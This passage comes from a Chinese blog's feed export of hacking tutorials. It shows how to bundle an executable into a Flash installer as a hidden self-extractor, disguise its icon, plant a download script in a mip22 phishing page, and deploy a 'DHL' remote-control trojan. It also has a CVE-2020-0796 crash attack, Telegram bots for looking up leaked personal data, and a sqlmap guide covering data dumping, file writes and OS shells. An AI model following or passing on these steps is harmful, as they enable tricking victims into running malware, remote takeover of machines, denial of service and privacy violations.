alt="更改js"></p><p>将地址改成本机IP地址，将IP后面的文件改成flag.exe（此文件需要下载）。</p><p>此时再刷新网页点击<strong>立刻升级</strong>，下载flag.exe文件并运行，屏幕上就会出现5只苍蝇。</p><h2 id="将flag-exe和flash安装包混合"><a href="#将flag-exe和flash安装包混合" class="headerlink" title="将flag.exe和flash安装包混合"></a>将flag.exe和flash安装包混合</h2><p>1.下载<a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/winrar.rar">winrar.rar</a>压缩包并解压，解压后如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgwinrar.png" alt="winrar"></p><p>2.双击winrar.exe找到flag.exe和flashcenter_install_cn.exe文件，使用长按crtl+点击选中两个文件，再点击添加</p><p>3.更改创建压缩包的参数</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg-1.png" alt="img-1"></p><p>⾼级-&gt;⾼级⾃解压选项，路径设置 C:\windows\temp</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg-2.png" alt="img-2"></p><p>设置添加 C:\windows\temp\flashcenter_pp_ax_install_cn.exe C:\windows\temp\flash.exe（文件名可能不同）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg-3.png" alt="img-3"></p><p>模式设置全部隐藏</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg-4.png" alt="img-4"></p><p>更新设置</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg-5.png" alt="img-5"></p><p>最后生成压缩文件。</p><h2 id="将压缩文件更改名字和图标"><a href="#将压缩文件更改名字和图标" class="headerlink" title="将压缩文件更改名字和图标"></a>将压缩文件更改名字和图标</h2><p>1.下载<a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/Restorator%E5%9B%BE%E6%A0%87%E4%BF%AE%E6%94%B9%E5%99%A8.rar">Restorator.rar</a>压缩包并解压</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgRestorator..png" alt="Restorator."></p><p>2.双击Restorator.exe</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgRestorator.exe.png" alt="Restorator.exe"></p><p>将压缩包Downloads.exe和flashcenter_install_cn.exe拖入左侧资源树</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%94%B9%E5%9B%BE%E6%A0%87.png" alt="改图标"></p><p>3.将Downloads.exe的图标文件删除并将flashcenter_install_cn.exe的图标文件复制到Downloads.exe文件点击保存就会自动生成Downloads备份.exe文件，将Downloads备份.exe文件重命名为flash.exe其图标就会改变。</p><h2 id="使用mip22完善网页"><a href="#使用mip22完善网页" class="headerlink" title="使用mip22完善网页"></a>使用mip22完善网页</h2><p>1.使用mip22（详情在<em>利用软件写钓鱼网页</em>）生成网页，将网页复制到写木马的机器中</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%92%93%E9%B1%BC%E7%BD%91%E9%A1%B51.png" alt="钓鱼网页1"></p><p>2.将1.html中的<code>&lt;script src=&quot;./flash(2).js&quot;&gt;&lt;/script&gt;</code>复制到Sign In.html的body标签的任意位置，再在网页输入127.0.0.1&#x2F;Sign In.html</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC%E7%95%8C%E9%9D%A2.png" alt="下载木马界面">点击<em>立即升级</em>就会下载到捆绑好的flash.exe，下载好后就会在屏幕上出现5只苍蝇。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用软件写钓鱼网页</title>
    <link href="/2023/11/28/%E5%88%A9%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%86%99%E9%92%93%E9%B1%BC%E7%BD%91%E9%A1%B5/"/>
    <url>/2023/11/28/%E5%88%A9%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%86%99%E9%92%93%E9%B1%BC%E7%BD%91%E9%A1%B5/</url>
    
    <content type="html"><![CDATA[<h3 id="自动生成网页"><a href="#自动生成网页" class="headerlink" title="自动生成网页"></a>自动生成网页</h3><p>1.使用<code>vim /etc/proxychains4.conf</code>更改代理配置，找到<code>scoks4 127.0.0.1 </code>将其修改为<code>scoks5 + 有代理的IP地址 + 其端口号</code>。</p><p>2.使用<code>proxychains4 git clone https://github.com/makdosx/mip22</code>下载mip22到本地。（若是无法下载则确认IP地址和代理IP地址是否是同一网段）</p><p>3.运行<em>mip22.sh</em></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> mip22   <span class="hljs-string">//</span>跳转到下载文件的根目录下（若无法跳转则使用绝对路径）<br>chmod +x <span class="hljs-string">./</span>*   <span class="hljs-string">//</span>将mip22下的所有文件添加可执行权限<br>proxychains4 bash mip22.sh  <span class="hljs-string">//</span>运行mip22.sh<br></code></pre></td></tr></table></figure><p>4.运行后进入下图：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgmip22.png" alt="mip22"></p><p>选择所需要的功能就能生成网址。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg%25E9%2592%2593%25E9%25B1%25BC%25E7%25BD%2591%25E9%25A1%25B5.png" alt="钓鱼网页地址"></p><hr><h3 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h3><p>1.到vscode官网下载：<a href="https://code.visualstudio.com/">Visual Studio Code - Code Editing. Redefined</a></p><p>2.到扩展下载：python，chinese，code runner。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%A9%E5%B1%95.png" alt="扩展"></p><p>现在就可以正常运行python文件了。</p><hr><h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><p>下载<a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E8%BF%9C%E6%8E%A7/windows%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/DHLv9.5.zip">DHLV9.5</a>(该文件为恶意软件需要关闭防火墙和杀毒软件才能下载)，解压后文件如图：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%A4%A7%E7%81%B0%E7%8B%BC.png" alt="大灰狼"></p><p>点击大灰狼远程管理软件V9.5.exe</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9C%E6%8E%A7.png" alt="远控"></p><p>点击服务生成（ip需要修改为主机IP其他默认）会生成serve.exe，将其复制到其他机器并运行在上图页面就能看到被远程控制的机器。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web前端开发介绍</title>
    <link href="/2023/11/27/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/11/27/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>永恒之黑实现蓝屏</title>
    <link href="/2023/11/27/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%AE%9E%E7%8E%B0%E8%93%9D%E5%B1%8F/"/>
    <url>/2023/11/27/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%AE%9E%E7%8E%B0%E8%93%9D%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<p>注册telegram账号</p><p>1.下载telegram</p><p>2.打开手机软件，输入手机号码（需开代理），等待验证码，输入后就可以登入telegram。</p><p><em>若是国内的手机号不发送验证码可以尝试：1.使用<a href="https://sms-activate.org/cn/freePrice#activation">sms</a>虚拟手机号注册。2.使用Dingtone软件虚拟手机号注册。</em></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">您的专属邀请链接:<span class="hljs-keyword">https</span>://t.me/AJL01_bot?<span class="hljs-built_in">start</span>=C9uZSsbKX1<br>社工庫机器人: t.me/aishegongkubot?<span class="hljs-built_in">start</span>=AISGK_HBEIR85X<br><span class="hljs-keyword">https</span>://t.me/DATA_007bot?<span class="hljs-built_in">start</span>=<span class="hljs-number">8989324940</span><br><span class="hljs-keyword">https</span>://t.me/pingansgk_bot?<span class="hljs-built_in">start</span>=ee95c5680f<br><span class="hljs-keyword">https</span>://t.me/JokerSGKbot?<span class="hljs-built_in">start</span>=<span class="hljs-number">87</span>OE61VQ<br> <span class="hljs-keyword">https</span>://t.me/PyramidNetBot?<span class="hljs-built_in">start</span>=<span class="hljs-variable">pRg3K08</span><br><span class="hljs-keyword">https</span>://t.me/XingDun2Bot?<span class="hljs-built_in">start</span>=<span class="hljs-number">4</span>eoHoLE<br><span class="hljs-comment">#telegram社工群，查询泄露的信息</span><br></code></pre></td></tr></table></figure><h3 id="永恒之黑"><a href="#永恒之黑" class="headerlink" title="永恒之黑"></a>永恒之黑</h3><p>下载poc脚本发起攻击</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载POC：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/eerykitty/</span>CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">0796</span>-PoC<br></code></pre></td></tr></table></figure><p>需要下载一些python文件，才能运行脚本。pip下载，根据提示下载相应文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">0796</span>.py 攻击电脑的IP地址  <span class="hljs-regexp">//</span>运行脚本若提示需要文件，则使用pip下载对应的文件<br><br>pip3 install   xxxxx -i http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/pypi/</span>simple<span class="hljs-regexp">/ --trusted-host mirrors.aliyun.com   /</span>/pip下载<br></code></pre></td></tr></table></figure><p>运行脚本被攻击的电脑就会蓝屏。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2023/11/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/11/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p><h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><p>-h                                           显示基本帮助信息</p><p>-hh                                         显示高级帮助信息</p><p>–version                                显示版本号</p><p>-v                                           详细等级（0-6 默认 1）<br>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头·<br>6：显示http响应内容</p><p>Target：                                </p><p>-u                                          指定目标url</p><p>-d                                          直接连接数据库</p><p>-l                                           从burp代理日志的解析目标</p><p>-r                                           从文件中加载http请求</p><p>-g                                          从google dork的结果作为目标url</p><p>-c                                          从INI配置文件中加载选项</p><p>Request</p><p>-A                                         指定user-agent头</p><p>-H                                         额外的header</p><p>-method&#x3D;                              指定HTTP方法（GET&#x2F;POST）</p><p>–data&#x3D;                                 通过POST提交数据    </p><p>–param-del&#x3D;                        指定参数分隔符</p><p>–cookie&#x3D;                              指定cookie的值</p><p>–cookie-del&#x3D;                        指定cookie分隔符</p><p>–drop-set-cookie                  扔掉response中的set-cookie头</p><p>–random-agent                    使用随机的user-agent头</p><p>–host&#x3D;                                  设置host头 </p><p>–referer&#x3D;                              指定referer头</p><p>–headers&#x3D;                            额外的headers</p><p>–auth-type&#x3D;                          http认证类型（Basic，NTLM，Digest）</p><p>–auith-cred&#x3D;                         http认证凭证（账号：密码）</p><p>–ignore-proxy                       忽略系统代理（常用于扫描本地文件）</p><p>–proxy&#x3D;                                使用代理</p><p>–proxy-cred&#x3D;                        代理认证证书（账号：密码）</p><p>–delay&#x3D;                                 设置延迟时间（两个请求之间）</p><p>–timeout&#x3D;                              超时时来连接前等待（默认 30）</p><p>–retries&#x3D;                                连接超时时重试次数（默认 3）</p><p>–randomize&#x3D;                         随机更改指定的参数的值</p><p>–safe-url&#x3D;                             在测试期间经常访问的URL</p><p>–safe-post&#x3D;                           POST数据发送到安全的URL</p><p>–safe-freq&#x3D;                           两次请求之间穿插一个安全的URL   </p><p>–skip-urlencode                    跳过payload数据的URL编码</p><p>–chunked                             使用HTTP分块传输加密POST请求</p><p>–hpp                                    使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测）</p><p>–force-ssl                             强制使用SSL&#x2F;HTTPS</p><p>–eval&#x3D;value                         请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”）</p><p>Optimization</p><p>-o                                         打开所有优化开关</p><p>–predict-output                   预测输出（与–threads不兼容）</p><p>–keep-alive                         建立长久的HTTP(S)连接 (与–proxy不兼容)</p><p>–null-connection                 空连接</p><p>–threads&#x3D;value                  设置线程(默认 1)</p><p>Injection</p><p>-p                                       指定测试参数</p><p>–skip&#x3D;                               跳过指定参数的测试</p><p>–skip-static                        跳过测试静态的参数</p><p>–dbms&#x3D;                             指定具体DBMS</p><p>–os&#x3D;                                  指定DBMS操作系统</p><p>–invalid-bignum                使用大数字使值无效</p><p>–invalid-logical                  使用逻辑符使值无效</p><p>–invalid-string                   使用字符串使值无效</p><p>–no-cast                             关闭payload铸造机制</p><p>–no-escape                       关闭字符转义机制（默认自动开启）</p><p>–prefix&#x3D;                             加入payload前缀</p><p>–suffix&#x3D;                              加入payload后缀</p><p>–tamper&#x3D;                          指定使用的脚本</p><p>Detectiong</p><p>–level&#x3D;                              指定测试的等级（1-5 默认为1）</p><p>–risk&#x3D;                               指定测试的风险（0-3 默认为1）</p><p>–string&#x3D;                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</p><p>–not-string&#x3D;                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</p><p>–code&#x3D;                             查询为真时，匹配的HTTP代码</p><p>–smart                              当有大量检测目标时，只选择基于错误的检测结果</p><p>–text-only                         仅基于文本内容比较网页</p><p>–titles                               仅基于标题比较网页</p><p>Techniques</p><p>–technique&#x3D;                      指定sql注入技术（默认BEUSTQ）</p><p>–time-sec&#x3D;                        基于时间注入检测相应的延迟时间（默认为5秒）</p><p>–union-clos&#x3D;                     进行查询时，指定列的范围</p><p>–union-char&#x3D;                    指定暴力破解列数的字符</p><p>Fingerprint</p><p>-f                                      查询目标DBMS版本指纹信息</p><p>Emuneration</p><p>-a                                    查询所有  </p><p>-b                                    查询目标DBMS banner信息</p><p>–current-user                 查询目标DBMS当前用户</p><p>–current-db                    查询目标DBMS当前数据库</p><p>–is-dba                          查询目标DBMS当前用户是否为DBA</p><p>–users                            枚举目标DBMS所有的用户</p><p>–paswords                     枚举目标DBMS用户密码哈希值</p><p>–privileges                     枚举目标DBMS用户的权限</p><p>–roles                            枚举DBMS用户的角色</p><p>–dbs                              枚举DBMS所有的数据库</p><p>–tables                          枚举DBMS数据库中所有的表</p><p>–columns                      枚举DBMS数据库表中所有的列</p><p>–count                         检索表的条目的数量</p><p>–dump                         存储DBMS数据库的表中的条目</p><p>–dump-all                     存储DBMS所有数据库表中的条目</p><p>-D db                          指定进行枚举的数据库名称</p><p>-T   table                     指定进行枚举的数据库表名称</p><p>-C   column                 指定进行枚举的数据库列名称</p><p>–exclude-sysdbs          枚举表时排除系统数据库</p><p>–sql-query                    指定查询的sql语句</p><p>–sql-shell                     提示输入一个交互式sql shell</p><p>Brute force</p><p>–common-tables                       暴力破解表 </p><p>–common-colomns                    暴力破解列</p><p>File system access</p><p>–file-read                            从目标数据库管理文件系统读取文件</p><p>–file-write                           上传文件到目标数据库管理文件系统</p><p>–file-dest                             指定写入文件的绝对路径</p><p>–os-cmd&#x3D;                           执行操作系统命令</p><p>–os-shell                            交互式的系统shell</p><p>–os-pwn                             获取一个OOB shell，Meterpreter或者VNC</p><p>–os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</p><p>–os-bof                              储存过程缓冲区溢出利用</p><p>–os-esc                              数据库进程用户权限提升</p><p>–msf-path&#x3D;                        Metasploit  Framework本地安装路径</p><p>General</p><p>-s                                     sqlite会话文件保存位置</p><p>-t                                      记录所有HTTP流量到指定文件中</p><p>–batch                             测试过程中， 执行所有默认配置</p><p>–charset&#x3D;v                      强制用于数据检索的字符编码 </p><p>–crawl&#x3D;                           从目标URL开始爬取网站</p><p>–crawl-exclude&#x3D;              禁止爬取某个页面（eg：logout）</p><p>–csv-del&#x3D;                        指定CSV输出中使用的的字符</p><p>–dump-format&#x3D;               储存数据的方式（CSV(default)，HTML，SQLITE）</p><p>–flush-session                 刷新当前目标的会话文件</p><p>–fresh-queries                 忽略会话文件中储存的查询结果，重新查询</p><p>–hex                                使用DBMS hex函数进行数据检索</p><p>–outpout-dir&#x3D;                  自定义输出目录</p><p>–save&#x3D;                            保存选项到INI配置文件中</p><p>–scope&#x3D;                          使用正则表达式从提供的日志中guo’l</p><p>–alert                               再找到SQL注入时运行主机操作系统命令</p><p>–purge-output                  安全的从输出目录中删除所有内容</p><p>–sqlmap-shell                  提示输入交互式sqlmap  shell</p><p>–update                           更新sqlmap</p><h3 id="sqlmap主要功能"><a href="#sqlmap主要功能" class="headerlink" title="sqlmap主要功能"></a>sqlmap主要功能</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-u 指定目标URL (可以是http协议也可以是https协议)</span><br> <br><span class="hljs-deletion">-d 连接数据库</span><br> <br><span class="hljs-deletion">--dbs 列出所有的数据库</span><br> <br><span class="hljs-deletion">--current-db 列出当前数据库</span><br> <br><span class="hljs-deletion">--tables 列出当前的表</span><br> <br><span class="hljs-deletion">--columns 列出当前的列</span><br> <br><span class="hljs-deletion">-D 选择使用哪个数据库</span><br> <br><span class="hljs-deletion">-T 选择使用哪个表</span><br> <br><span class="hljs-deletion">-C 选择使用哪个列</span><br> <br><span class="hljs-deletion">--dump 获取字段中的数据</span><br> <br><span class="hljs-deletion">--batch 自动选择yes</span><br> <br><span class="hljs-deletion">--smart 启发式快速判断，节约浪费时间</span><br>   <br><span class="hljs-deletion">--forms 尝试使用post注入</span><br> <br><span class="hljs-deletion">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br> <br><span class="hljs-deletion">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br> <br><span class="hljs-deletion">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br> <br><span class="hljs-deletion">-o 开启所有默认性能优化</span><br> <br><span class="hljs-deletion">--tamper 调用脚本进行注入</span><br> <br><span class="hljs-deletion">-v 指定sqlmap的回显等级</span><br> <br><span class="hljs-deletion">--delay 设置多久访问一次</span><br> <br><span class="hljs-deletion">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br> <br><span class="hljs-deletion">-m 批量操作</span><br> <br><span class="hljs-deletion">-c 指定配置文件，会按照该配置文件执行动作</span><br> <br><span class="hljs-deletion">-data data指定的数据会当做post数据提交</span><br> <br><span class="hljs-deletion">-timeout 设定超时时间</span><br> <br><span class="hljs-deletion">--level 设置注入探测等级</span><br> <br><span class="hljs-deletion">--risk 风险等级</span><br> <br><span class="hljs-deletion">--identify-waf 检测防火墙类型</span><br> <br><span class="hljs-deletion">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br> <br><span class="hljs-deletion">--skip-urlencode 不进行url编码</span><br> <br><span class="hljs-deletion">--keep-alive 设置持久连接，加快探测速度</span><br> <br><span class="hljs-deletion">--null-connection 检索没有body响应的内容，多用于盲注</span><br> <br><span class="hljs-deletion">--thread 最大为10 设置多线程</span><br></code></pre></td></tr></table></figure><h3 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h3><p>–technique&#x3D;     （默认全部使用）</p><p>B       基于布尔的盲注</p><p>T       基于时间的盲注</p><p>E      基于报错的注入</p><p>U      基于UNION查询注入</p><p>S      基于多语句查询注入</p><p>sqlmap获取目标方式<br>1.指定目标url</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“</p><p>2.从文件中获取多个url</p><p>sqlmap -m 1.txt</p><p>3.从文件中加载HTTP请求</p><p>sqlmap -r  url.txt</p><p>4.利用google获取目标</p><p>sqlmap -g “inurl:&quot;.php?id&#x3D;1&quot;“</p><p>5.从burp日志中获取目标</p><p>sqlmap -l    burp.txt</p><p>实例演示-sqlmap注入检测<br>1.GET参数注入</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“</p><p>2.POST参数注入</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  –data&#x3D;”id&#x3D;1”</p><p>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）  </p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 2</p><p>如图，用 * 号指定cookie，这样就可以检测cookie。</p><p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160325787.png" alt="img"></p><p>4.user-agent注入</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 3</p><p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160819622.png" alt="img"></p><p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p><p>5.referer注入</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 3</p><p>如图，用 * 号指定referer，这样就可以检测referer。</p><p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160842375.png" alt="img"></p><p>6.host注入</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 5</p><p>如图，用 * 号指定host，这样就可以检测host。</p><p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img2020051116100193.png" alt="img"></p><p>实例演示-获取数据库信息<br>1.查看数据库</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –dbs  –batch</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84%E5%BA%93%E5%90%8D.png" alt="查询网站的库名"></p><p><strong>2.查看数据库里面的表</strong></p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D pikachu –tables –batch</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2pikachu%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D.png" alt="查询pikachu库的表名"></p><p><strong>3.查看数据库表里面的列</strong></p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -T users –columns  –batch</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png" alt="查看表中字段名"></p><p>4.查看数据库列里面的具体的值</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -T users -C password  –dump  –batch<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png" alt="查看表中字段名"></p><h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p>使用条件：</p><p>1.MySQL数据库版本小于5.0，没有information——schema表。</p><p>2.Microssoft Access数据库。</p><p>3.当前用户没有权限读取系统中保存的数据。</p><p>*暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</p><p>1.暴力破解表名</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  -D security –common-tables –batch<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164600263.png" alt="img"></p><p><strong>2.暴力破解列名</strong></p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -Tusers –common-columns –batch</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164614628.png" alt="img"></p><h3 id="实例演示-读取文件-上传文件"><a href="#实例演示-读取文件-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  –file-read “C:&#x2F;post.txt”</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170318789.png" alt="img"></p><p>2写入文件</p><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“   –file-write “&#x2F;root&#x2F;1.txt” –file-dest “C:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;www&#x2F;1.txt”<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170525553.png" alt="img"></p><h4 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h4><p>python sqlmap.py -u “<a href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –os-shell</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数字型sql注入</title>
    <link href="/2023/11/23/%E6%95%B0%E5%AD%97%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/"/>
